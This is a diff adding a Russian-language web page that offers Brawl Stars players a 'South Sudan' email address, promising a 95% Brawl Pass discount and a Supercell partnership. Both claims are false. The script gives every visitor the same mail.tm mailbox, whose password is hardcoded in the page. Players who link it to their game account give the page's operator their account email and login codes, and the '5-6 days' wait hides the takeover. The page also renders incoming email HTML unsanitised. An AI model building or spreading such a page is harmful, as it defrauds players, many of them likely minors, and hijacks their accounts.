@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Почта Южный Судан</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: #fff;
+            color: #333;
+            text-align: center;
+            min-height: 100vh;
+            padding: 15px;
+            font-size: 14px;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px 15px;
+        }
+        .logo { font-size: 1.2em; font-weight: bold; color: #333; margin-bottom: 15px; }
+        .box {
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            text-align: left;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+        .green { color: #2e7d32; }
+        .yellow { color: #e65100; }
+        .red { color: #c62828; }
+
+        button {
+            background: #333;
+            border: none;
+            color: #fff;
+            padding: 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 14px;
+            margin: 5px 0;
+            width: 100%;
+        }
+        button:active { background: #555; }
+
+        .email-box {
+            border: 1px solid #ddd;
+            padding: 10px;
+            border-radius: 6px;
+            margin: 10px 0;
+            font-size: 13px;
+            word-break: break-all;
+            background: #fafafa;
+        }
+        .msg {
+            border: 1px solid #eee;
+            padding: 10px;
+            margin: 4px 0;
+            border-radius: 6px;
+            cursor: pointer;
+            text-align: left;
+            font-size: 13px;
+        }
+        .msg .from { color: #555; }
+        .msg .subject { margin-top: 2px; }
+
+        #statusMsg { color: #888; font-size: 12px; margin: 5px 0; min-height: 16px; }
+        hr { border: none; border-top: 1px solid #eee; margin: 10px 0; }
+
+        .footer-text {
+            font-size: 11px;
+            color: #aaa;
+            margin-top: 10px;
+            line-height: 1.4;
+        }
+
+        .main-page { display: none; }
+
+        .fade-in { animation: fade 0.3s ease; }
+        @keyframes fade { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Главная страница -->
+    <div class="ad-page fade-in" id="adPage">
+        <div class="logo">Почта Южный Судан</div>
+
+        <div class="box">
+            <p>Получите почту региона Южный Судан.</p>
+            <p style="margin-top:6px;">После привязки к аккаунту Brawl Stars цена Brawl Pass снизится до 50-100 руб.</p>
+        </div>
+
+        <div class="box">
+            <p><span class="green">✔</span> Работаем с 2020 года</p>
+            <p><span class="yellow">★</span> Более 1000 отзывов</p>
+            <p><span class="green">✔</span> Партнёр Supercell</p>
+        </div>
+
+        <div class="box">
+            <p><b>Как это работает:</b></p>
+            <p>1. Привяжите почту к аккаунту</p>
+            <p>2. Supercell проверит регион (5-6 дней)</p>
+            <p>3. Южный Судан — страна с низким доходом</p>
+            <p>4. Вы получите скидку 95%</p>
+        </div>
+
+        <div class="box">
+            <p><span class="red">⚠</span> Проверка занимает 5-6 дней. Не меняйте почту в это время.</p>
+        </div>
+
+        <button onclick="goToMail()">Получить почту</button>
+
+        <div class="footer-text">
+            Политика конфиденциальности · Условия · Отзывы<br>
+            © 2020-2026 Почта Южный Судан
+        </div>
+    </div>
+
+    <!-- Страница почты -->
+    <div class="main-page fade-in" id="mainPage">
+        <div class="logo">Ваша почта</div>
+
+        <div class="email-box" id="emailAddr">Загрузка...</div>
+
+        <button onclick="copyEmail()">Скопировать</button>
+        <button onclick="refreshInbox()">Обновить</button>
+
+        <div id="statusMsg"></div>
+
+        <hr>
+        <b>Входящие</b>
+        <div id="inbox" style="margin-top:5px;">Загрузка...</div>
+        <div id="emailView"></div>
+
+        <p style="font-size:11px;color:#aaa;margin-top:8px;">
+            Письмо придёт через 5-6 дней после проверки.
+        </p>
+    </div>
+
+</div>
+
+<script>
+function goToMail() {
+    document.getElementById('adPage').style.display = 'none';
+    document.getElementById('mainPage').style.display = 'block';
+    createMailbox();
+}
+
+let token = '';
+let email = '';
+let boxPassword = '';
+let allMessages = [];
+
+const API = 'https://api.mail.tm';
+
+async function createMailbox() {
+    document.getElementById('statusMsg').textContent = 'Создание...';
+    try {
+        const domainRes = await fetch(API + '/domains');
+        const domainData = await domainRes.json();
+        const domain = domainData['hydra:member'][0].domain;
+        
+        const address = 'southsudan@' + domain;
+        boxPassword = 'SudanBrawl2026!';
+        
+        let res = await fetch(API + '/token', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ address: address, password: boxPassword })
+        });
+        
+        if (!res.ok) {
+            await fetch(API + '/accounts', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address: address, password: boxPassword })
+            });
+            res = await fetch(API + '/token', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address: address, password: boxPassword })
+            });
+        }
+        
+        const tokenData = await res.json();
+        token = tokenData.token;
+        email = address;
+        document.getElementById('emailAddr').textContent = email;
+        document.getElementById('statusMsg').textContent = 'Готово. Ждите 5-6 дней.';
+        refreshInbox();
+    } catch(e) {
+        document.getElementById('statusMsg').textContent = 'Ошибка. Попробуйте снова.';
+    }
+}
+
+async function fetchMessages() {
+    if (!token) return [];
+    try {
+        const res = await fetch(API + '/messages', {
+            headers: { 'Authorization': 'Bearer ' + token }
+        });
+        if (!res.ok) return [];
+        const data = await res.json();
+        return data['hydra:member'] || [];
+    } catch(e) {
+        return [];
+    }
+}
+
+async function refreshInbox() {
+    if (!token) return;
+    allMessages = await fetchMessages();
+    const inbox = document.getElementById('inbox');
+    document.getElementById('emailView').innerHTML = '';
+    inbox.style.display = 'block';
+    
+    if (allMessages.length === 0) {
+        inbox.innerHTML = 'Писем пока нет.';
+        return;
+    }
+    inbox.innerHTML = allMessages.map(m => `
+        <div class="msg" onclick="openEmail('${m.id}')">
+            <div class="from">${m.from?.address || 'Неизвестно'}</div>
+            <div class="subject">${m.subject || '(без темы)'}</div>
+        </div>
+    `).join('');
+    document.getElementById('statusMsg').textContent = '';
+}
+
+async function openEmail(msgId) {
+    document.getElementById('inbox').style.display = 'none';
+    document.getElementById('emailView').innerHTML = 'Загрузка...';
+    
+    try {
+        const res = await fetch(API + '/messages/' + msgId, {
+            headers: { 'Authorization': 'Bearer ' + token }
+        });
+        const msg = await res.json();
+        document.getElementById('emailView').innerHTML = `
+            <div class="box" style="margin-top:8px;">
+                <button onclick="closeEmail()" style="width:auto;padding:5px 12px;font-size:12px;background:#888;">← Назад</button>
+                <p style="margin-top:8px;">От: ${msg.from?.address || 'Неизвестно'}</p>
+                <p><b>${msg.subject || '(без темы)'}</b></p>
+                <hr>
+                <div style="font-size:13px;">${msg.html || msg.text || 'Пустое письмо'}</div>
+            </div>
+        `;
+    } catch(e) {
+        document.getElementById('emailView').innerHTML = 'Ошибка загрузки';
+    }
+}
+
+function closeEmail() {
+    document.getElementById('emailView').innerHTML = '';
+    document.getElementById('inbox').style.display = 'block';
+}
+
+function copyEmail() {
+    if (!email) return;
+    navigator.clipboard.writeText(email);
+    document.getElementById('statusMsg').textContent = 'Скопировано!';
+}
+
+setInterval(async () => {
+    if (token && !document.getElementById('emailView').innerHTML) {
+        allMessages = await fetchMessages();
+        const inbox = document.getElementById('inbox');
+        if (inbox.style.display !== 'none') {
+            if (allMessages.length === 0) {
+                inbox.innerHTML = 'Писем пока нет.';
+            } else {
+                inbox.innerHTML = allMessages.map(m => `
+                    <div class="msg" onclick="openEmail('${m.id}')">
+                        <div class="from">${m.from?.address || 'Неизвестно'}</div>
+                        <div class="subject">${m.subject || '(без темы)'}</div>
+                    </div>
+                `).join('');
+            }
+        }
+    }
+}, 6000);
+</script>
+</body>
+  </html>
